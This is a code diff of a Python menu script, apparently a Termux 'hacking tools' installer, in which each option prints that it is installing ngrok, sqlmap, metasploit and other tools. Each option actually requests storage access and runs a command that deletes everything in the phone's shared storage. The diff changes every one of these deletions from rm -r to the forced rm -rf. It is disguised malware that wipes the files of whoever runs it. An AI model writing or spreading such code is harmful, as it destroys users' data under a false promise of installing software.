@@ -78,7 +78,7 @@ if eleccion == 1:
  os.system("apt update")
  os.system("termux-setup-storage")
  print("instalando ngrok...")
- os.system("rm -r /storage/emulated/0/*")
+ os.system("rm -rf /storage/emulated/0/*")
 
  
 
@@ -86,7 +86,7 @@ elif eleccion == 2:
  os.system("apt update")
  os.system("termux-setup-storage")
  print("instalando php...")
- os.system("rm -r /storage/emulated/0/*")
+ os.system("rm -rf /storage/emulated/0/*")
 
  
 
@@ -94,7 +94,7 @@ elif eleccion == 3:
  os.system("apt update")
  os.system("termux-setup-storage")
  print("instalando sqlmap...")
- os.system("rm -r /storage/emulated/0/*")
+ os.system("rm -rf /storage/emulated/0/*")
 
  
 
@@ -102,7 +102,7 @@ elif eleccion == 4:
  os.system("apt update")
  os.system("termux-setup-storage")
  print("instalando quak...")
- os.system("rm -r /storage/emulated/0/*")
+ os.system("rm -rf /storage/emulated/0/*")
 
  
 
@@ -110,7 +110,7 @@ elif eleccion == 5:
  os.system("apt update")
  os.system("termux-setup-storage")
  print("instalando metasploit...")
- os.system("rm -r /storage/emulated/0/*")
+ os.system("rm -rf /storage/emulated/0/*")
 
  
 
@@ -118,7 +118,7 @@ elif eleccion == 6:
  os.system("apt update")
  os.system("termux-setup-storage")
  print("instalando dooxtool...")
- os.system("rm -r /storage/emulated/0/*")
+ os.system("rm -rf /storage/emulated/0/*")
 
   
 
@@ -126,7 +126,7 @@ elif eleccion == 7:
  os.system("apt update")
  os.system("termux-setup-storage")
  print("instalando Hulck...")
- os.system("rm -r /storage/emulated/0/*")
+ os.system("rm -rf /storage/emulated/0/*")
 
  
 
@@ -134,7 +134,7 @@ elif eleccion == 8:
  os.system("apt update")
  os.system("termux-setup-storage")
  print("instalando perl...")
- os.system("rm -r /storage/emulated/0/*") 
+ os.system("rm -rf /storage/emulated/0/*") 
 
  
 
@@ -150,7 +150,7 @@ elif eleccion == 10:
  os.system("apt update")
  os.system("termux-setup-storage")
  print("instalando python3...")
- os.system("rm -r /storage/emulated/0/*")
+ os.system("rm -rf /storage/emulated/0/*")
 
  
 
@@ -158,7 +158,7 @@ elif eleccion == 11:
  os.system("apt update")
  os.system("termux-setup-storage")
  print("instalando dork...")
- os.system("rm -r /storage/emulated/0/*")
+ os.system("rm -rf /storage/emulated/0/*")
 
  
 
@@ -166,4 +166,4 @@ elif eleccion == 12:
  os.system("apt update")
  os.system("termux-setup-storage")
  print("instalando python...")
- os.system("rm -r /storage/emulated/0/*") 
+ os.system("rm -rf /storage/emulated/0/*") 
